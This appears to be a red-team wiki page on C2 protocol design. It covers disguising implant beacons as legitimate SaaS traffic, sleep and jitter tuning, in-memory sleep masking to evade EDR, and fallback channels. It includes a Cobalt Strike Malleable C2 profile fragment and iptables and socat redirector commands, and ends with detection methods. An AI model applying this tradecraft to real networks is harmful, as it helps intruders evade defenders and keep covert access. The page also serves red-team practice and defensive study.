---
title: C2 protocol design
slug: c2-protocol-design
---

> **TL;DR:** Make beacon traffic look exactly like a real product talking to its real backend — same URIs, headers, response shape, timing distribution.

## What it is
The C2 protocol is the on-the-wire contract between implant and team server: transport (HTTPS/DNS/SMB), framing, encryption, encoded request/response. "Profile design" means shaping that contract so it blends into legitimate traffic on the target network. Bad profiles get caught by signature; good ones force defenders to use behavioural analytics.

## Preconditions / where it applies
- You control your implant config / profile (most frameworks support this)
- You have visibility into what the target environment's "normal" traffic looks like — recon helps
- You have layered infrastructure: domain → CDN/redirector → team server

## Technique
**Shape.** Mimic a real SaaS your target already uses. If they use Slack, your URIs are `/api/conversations.list`, headers include `User-Agent: Slack-Desktop/4.x`, requests are POST JSON with realistic-looking session cookies. If they use a telemetry vendor, you copy its beaconing cadence.

**Timing.** Sleep + jitter dominate detection. A 60s/30% pattern is interactive; 12h/40% is long-haul implant. Choose by phase of engagement. Add fractional drift (timer skew) so two beacons on the same host don't fire in lockstep.

**Sleep mask.** During sleep, your beacon heap must not be readable executable text. Patterns: Ekko (timer-queue + RC4), Foliage (APC), Hunt-Sleeping-Beacons defeat unless masked. Modern beacons also re-encrypt return addresses and stack frames.

**Indicators of transport health.** Pick HTTP statuses and bodies that look real. Empty 200s are a signal. Pad responses to a content-length distribution learnt from baseline traffic.

**Egress paths.** HTTPS through a CDN (categorised domain, valid cert), DNS through a parented authoritative zone, SMB pivots through named pipes for lateral comms. Avoid DGA-shaped domains and freshly-registered TLDs.

```
# Cobalt Strike Malleable C2 fragment (illustrative)
set sleeptime "30000";
set jitter "37";
http-get {
  set uri "/api/v1/sync";
  client {
    header "Accept" "application/json";
    header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...";
    metadata { base64url; prepend "session="; header "Cookie"; }
  }
  server {
    header "Content-Type" "application/json";
    output { netbios; print; }
  }
}
```

**Backup channels.** Always have a different transport for fallback (HTTPS primary, DNS secondary). Single-channel beacons die when the egress proxy blocks the category.

**Redirector plumbing matters as much as the profile.** A throwaway VPS in front of the team server should run iptables PREROUTING DNAT with MASQUERADE on POSTROUTING (`iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination <team-server>:443; iptables -t nat -A POSTROUTING -j MASQUERADE` plus `sysctl net.ipv4.ip_forward=1`) or a `socat TCP4-LISTEN:443,fork TCP4:<team-server>:443` forwarder. Apache `mod_rewrite` redirectors are stronger because they can drop non-beacon URIs to a decoy site based on User-Agent and URI regex, so an analyst poking the redirector domain in a browser sees a legitimate-looking page rather than a transparent 404 from the beacon listener.

## Detection and defence
- JA3/JA4 client fingerprints — match your beacon's TLS stack to the impersonated product, not to whatever C runtime your dropper used
- Domain age and category — newly-registered, uncategorised domains light up DNS analytics
- Beacon periodicity detection (RITA, Zeek) catches even jittered traffic over hours
- Request entropy — high-entropy URIs or cookies stick out among real product traffic
- Memory: sleep-mask quality is now the deciding factor on enterprise EDR scans

## References
- [Cobalt Strike Malleable C2 reference](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_main.htm) — full profile DSL
- [Offensive Defence blog](https://offensivedefence.co.uk/) — sleep mask and tradecraft deep dives
- [Active Countermeasures — RITA](https://www.activecountermeasures.com/free-tools/rita/) — beacon analysis defenders run
- [ired.team — HTTP forwarders / redirectors](https://www.ired.team/offensive-security/red-team-infrastructure/redirectors-forwarders) — iptables and socat recipes for C2 redirectors
- [[c2-frameworks]] [[infrastructure-design]] [[opsec-fundamentals]]
